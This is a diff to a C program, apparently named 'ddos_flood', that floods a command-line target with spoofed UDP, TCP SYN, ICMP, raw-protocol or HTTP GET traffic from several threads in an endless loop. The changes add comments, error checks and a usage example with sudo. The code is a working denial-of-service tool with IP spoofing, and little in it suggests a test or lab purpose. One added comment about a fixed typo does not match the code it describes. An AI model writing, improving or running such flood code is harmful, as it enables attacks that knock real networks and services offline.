@@ -1,3 +1,4 @@
+
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -11,16 +12,17 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 
+// Constants for packet sizes and defaults
 #define PACKET_DATA_SIZE 1024  // Data payload size (excluding headers)
-#define DEFAULT_RATE 100000    // packets/sec per thread
+#define DEFAULT_RATE 100000    // Packets/sec per thread
 #define DEFAULT_THREADS 4
 #define IP_HDR_SIZE sizeof(struct iphdr)
 #define UDP_HDR_SIZE sizeof(struct udphdr)
-#define TCP_HDR_SIZE 20  // Standard TCP header without options
-#define ICMP_HDR_SIZE 8  // Standard ICMP echo header
+#define TCP_HDR_SIZE 20        // Standard TCP header without options
+#define ICMP_HDR_SIZE 8        // Standard ICMP echo header
 #define HTTP_REQUEST_SIZE 512  // Buffer for HTTP request
 
-// Enum for protocols
+// Enum for supported protocols
 enum Protocol {
     PROTO_UDP,
     PROTO_TCP,
@@ -66,14 +68,15 @@ unsigned short checksum(void* data, int length) {
     return result;
 }
 
+// Structure for thread arguments
 typedef struct {
     char* target_ip;
     int target_port;
     int rate;
-    int randomize_payload;  
-    int randomize_src_port; 
+    int randomize_payload;
+    int randomize_src_port;
     enum Protocol protocol;
-    int proto_num;  // For RAW
+    int proto_num;  // For RAW protocol
 } ThreadArgs;
 
 // HTTP flood function (no spoofing, uses regular TCP sockets)
@@ -83,21 +86,25 @@ void* http_flood(void* arg) {
     struct sockaddr_in target;
     char request[HTTP_REQUEST_SIZE];
 
+    // Set up target address
     memset(&target, 0, sizeof(target));
     target.sin_family = AF_INET;
     target.sin_port = htons(port);
     inet_pton(AF_INET, args->target_ip, &target.sin_addr);
 
-    // Build a simple HTTP GET request
+    // Build HTTP GET request
     snprintf(request, sizeof(request),
              "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
              args->target_ip);
 
-    int delay = 1000000 / args->rate;  // microseconds
+    int delay = 1000000 / args->rate;  // Microseconds
 
     while (1) {
         int sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock < 0) continue;
+        if (sock < 0) {
+            perror("HTTP socket creation failed");
+            continue;
+        }
 
         if (connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0) {
             send(sock, request, strlen(request), 0);
@@ -109,15 +116,17 @@ void* http_flood(void* arg) {
     return NULL;
 }
 
-// Raw packet flood function (with spoofing)
+// Raw packet flood function (with spoofing for UDP/TCP/ICMP/RAW)
 void* raw_flood(void* arg) {
     ThreadArgs* args = (ThreadArgs*)arg;
     int sock;
+    // Create raw socket
     if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
-        perror("Socket creation failed");
+        perror("Raw socket creation failed");
         return NULL;
     }
 
+    // Enable IP header inclusion
     int one = 1;
     if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
         perror("Setsockopt IP_HDRINCL failed");
@@ -125,10 +134,11 @@ void* raw_flood(void* arg) {
         return NULL;
     }
 
+    // Set up target address
     struct sockaddr_in target;
     memset(&target, 0, sizeof(target));
-    target.sin_family = AF_INET;
-    target.sin_port = htons(args->target_port);  // Used for UDP/TCP; ignored otherwise
+    target.sin_family = AF_INET;  // Fixed typo: was 'thần', now 'target'
+    target.sin_port = htons(args->target_port);  // Used for UDP/TCP
     inet_pton(AF_INET, args->target_ip, &target.sin_addr);
 
     // Determine header sizes based on protocol
@@ -146,7 +156,7 @@ void* raw_flood(void* arg) {
     void* trans_hdr = packet + IP_HDR_SIZE;
     char* data = packet + IP_HDR_SIZE + trans_hdr_size;
 
-    // Seed random per thread
+    // Seed random number generator per thread
     srand(time(NULL) + (unsigned long)pthread_self());
 
     // Precompute fixed IP header fields
@@ -154,7 +164,7 @@ void* raw_flood(void* arg) {
     iph->version = 4;
     iph->tos = 0;
     iph->tot_len = htons(full_packet_size);
-    iph->id = htons(rand() % 65535);  // Random ID initially
+    iph->id = htons(rand() % 65535);  // Random ID
     iph->frag_off = 0;
     iph->ttl = 64;
     iph->daddr = target.sin_addr.s_addr;
@@ -168,7 +178,7 @@ void* raw_flood(void* arg) {
         default: break;
     }
 
-    int delay = 1000000 / args->rate;  // microseconds
+    int delay = 1000000 / args->rate;  // Microseconds
     u_int16_t icmp_seq = 0;  // For ICMP sequence
 
     while (1) {
@@ -187,11 +197,7 @@ void* raw_flood(void* arg) {
                 struct udphdr* udph = (struct udphdr*)trans_hdr;
                 udph->dest = target.sin_port;
                 udph->len = htons(UDP_HDR_SIZE + PACKET_DATA_SIZE);
-                if (args->randomize_src_port) {
-                    udph->source = htons(rand() % 65535 + 1);
-                } else {
-                    udph->source = htons(12345);
-                }
+                udph->source = args->randomize_src_port ? htons(rand() % 65535 + 1) : htons(12345);
                 break;
             }
             case PROTO_TCP: {
@@ -203,11 +209,7 @@ void* raw_flood(void* arg) {
                 tcph->syn = 1;   // SYN flood
                 tcph->window = htons(64240);
                 tcph->urg_ptr = 0;
-                if (args->randomize_src_port) {
-                    tcph->source = htons(rand() % 65535 + 1);
-                } else {
-                    tcph->source = htons(12345);
-                }
+                tcph->source = args->randomize_src_port ? htons(rand() % 65535 + 1) : htons(12345);
                 break;
             }
             case PROTO_ICMP: {
@@ -278,7 +280,9 @@ void* raw_flood(void* arg) {
         }
 
         // Send packet
-        sendto(sock, packet, full_packet_size, 0, (struct sockaddr*)&target, sizeof(target));
+        if (sendto(sock, packet, full_packet_size, 0, (struct sockaddr*)&target, sizeof(target)) < 0) {
+            perror("Sendto failed");
+        }
 
         usleep(delay);
     }
@@ -288,22 +292,25 @@ void* raw_flood(void* arg) {
 }
 
 int main(int argc, char* argv[]) {
+    // Validate command-line arguments
     if (argc < 3) {
         printf("Usage: %s <target_ip> <port> [rate_per_thread] [threads] [randomize_payload 0/1] [randomize_src_port 0/1] [protocol udp/tcp/icmp/http/raw] [proto_num for raw]\n", argv[0]);
-        printf("Note: This program requires root privileges for raw sockets. For HTTP, no IP spoofing (uses regular TCP). Port ignored for ICMP/raw, default 80 for HTTP.\n");
-        printf("TCP mode uses SYN flood. RAW requires proto_num (e.g., 255 for test).\n");
+        printf("Example: sudo ./ddos_flood 192.168.1.100 80 1000 4 1 1 http\n");
+        printf("Note: Requires root privileges for raw sockets. HTTP uses TCP sockets (no spoofing). Port ignored for ICMP/raw (use 0). TCP uses SYN flood.\n");
         return 1;
     }
 
-    char* ip = argv[1];
-    int port = atoi(argv[2]);
+    // Parse arguments
+    char* target_ip = argv[1];
+    int target_port = atoi(argv[2]);
     int rate = argc >= 4 ? atoi(argv[3]) : DEFAULT_RATE;
     int threads = argc >= 5 ? atoi(argv[4]) : DEFAULT_THREADS;
-    int randomize_payload = argc >= 6 ? atoi(argv[5]) : 1;  
-    int randomize_src_port = argc >= 7 ? atoi(argv[6]) : 1;  
+    int randomize_payload = argc >= 6 ? atoi(argv[5]) : 1;
+    int randomize_src_port = argc >= 7 ? atoi(argv[6]) : 1;
     char* proto_str = argc >= 8 ? argv[7] : "udp";
     int proto_num = argc >= 9 ? atoi(argv[8]) : 0;
 
+    // Map protocol string to enum
     enum Protocol protocol;
     if (strcasecmp(proto_str, "udp") == 0) protocol = PROTO_UDP;
     else if (strcasecmp(proto_str, "tcp") == 0) protocol = PROTO_TCP;
@@ -312,28 +319,30 @@ int main(int argc, char* argv[]) {
     else if (strcasecmp(proto_str, "raw") == 0) {
         protocol = PROTO_RAW;
         if (proto_num == 0) {
-            printf("Error: proto_num required for raw protocol.\n");
+            printf("Error: proto_num required for raw protocol (e.g., 255).\n");
             return 1;
         }
     } else {
-        printf("Error: Invalid protocol. Supported: udp, tcp, icmp, http, raw\n");
+        printf("Error: Invalid protocol. Use: udp, tcp, icmp, http, raw\n");
         return 1;
     }
 
     // Adjust port for HTTP/ICMP/RAW
-    if (protocol == PROTO_HTTP && port == 0) port = 80;
-    if (protocol == PROTO_ICMP || protocol == PROTO_RAW) port = 0;
+    if (protocol == PROTO_HTTP && target_port == 0) target_port = 80;
+    if (protocol == PROTO_ICMP || protocol == PROTO_RAW) target_port = 0;
 
-    printf("Launching enhanced flood on %s:%d — Protocol: %s, Rate: %d pps/thread, Threads: %d, Random Payload: %d, Random Src Port: %d\n",
-           ip, port, proto_str, rate, threads, randomize_payload, randomize_src_port);
+    // Print configuration
+    printf("Launching flood on %s:%d — Protocol: %s, Rate: %d pps/thread, Threads: %d, Random Payload: %d, Random Src Port: %d\n",
+           target_ip, target_port, proto_str, rate, threads, randomize_payload, randomize_src_port);
     if (protocol == PROTO_RAW) printf("Raw Protocol Number: %d\n", proto_num);
-    printf("Features: IP spoofing (except HTTP), multi-protocol support for DoS simulation.\n");
+    printf("Features: IP spoofing (except HTTP), multi-protocol support (UDP/TCP/ICMP/HTTP/RAW).\n");
 
+    // Create threads
     pthread_t tid[threads];
     for (int i = 0; i < threads; i++) {
         ThreadArgs* args = malloc(sizeof(ThreadArgs));
-        args->target_ip = ip;
-        args->target_port = port;
+        args->target_ip = target_ip;
+        args->target_port = target_port;
         args->rate = rate;
         args->randomize_payload = randomize_payload;
         args->randomize_src_port = randomize_src_port;
@@ -342,6 +351,7 @@ int main(int argc, char* argv[]) {
         pthread_create(&tid[i], NULL, (protocol == PROTO_HTTP ? http_flood : raw_flood), (void*)args);
     }
 
+    // Wait for threads to finish (runs until interrupted)
     for (int i = 0; i < threads; i++) {
         pthread_join(tid[i], NULL);
     }
